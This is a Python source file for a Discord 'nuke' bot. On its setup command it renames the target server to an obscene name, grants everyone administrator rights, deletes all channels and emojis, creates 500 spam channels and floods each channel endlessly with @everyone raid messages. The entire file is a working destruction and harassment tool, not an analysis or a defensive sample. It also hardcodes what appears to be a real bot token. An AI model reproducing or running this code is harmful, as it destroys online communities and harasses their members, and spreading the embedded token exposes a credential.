import discord, random, asyncio
from discord.ext import commands
from discord import Permissions

prefix = ">"
token = "ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.vpM1V1sZzTaHHLwiiVEKnrilN2Y"
client = commands.Bot(command_prefix=commands.when_mentioned_or(prefix))

SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi","I run you","kinda got beamed by Chupapi"]
SPAM_MESSAGE = ["@everyone CHUPAPI MUNYANYOO?!(SERVER GOT RAIDED, WHAT ASHAME)"]

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    print(f"username: {client.user.name}")
    print(f"id: {client.user.id}")
    print(f"prefix: '{prefix}'")
    print('===============================================')
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f">setup | {len(client.guilds)} servers"))

@client.command()
async def setup(ctx):
      await ctx.message.delete()
      for i in range(1):
          try:
            await ctx.guild.edit(name="FUCKED BY CHUPAPI MUNYANYO!")
            print("server name has been changed...")
          except:
            print("server name could not be changed...")
      guild = ctx.guild
      try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print("I have given everyone admin.")
      except:
        print("I was unable to give everyone admin")
      for channel in guild.channels:
        try:
          await channel.delete()
          print(f"{channel.name} was deleted.")
        except:
          print(f"{channel.name} was NOT deleted.")
      for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{emoji.name} Was deleted")
        except:
            print(f"{emoji.name} Wasn't Deleted")
      amount = 500
      for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
      print(f"nuked {guild.name} Successfully.")
      return

@client.event
async def on_guild_channel_create(channel):
    while True:
      await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
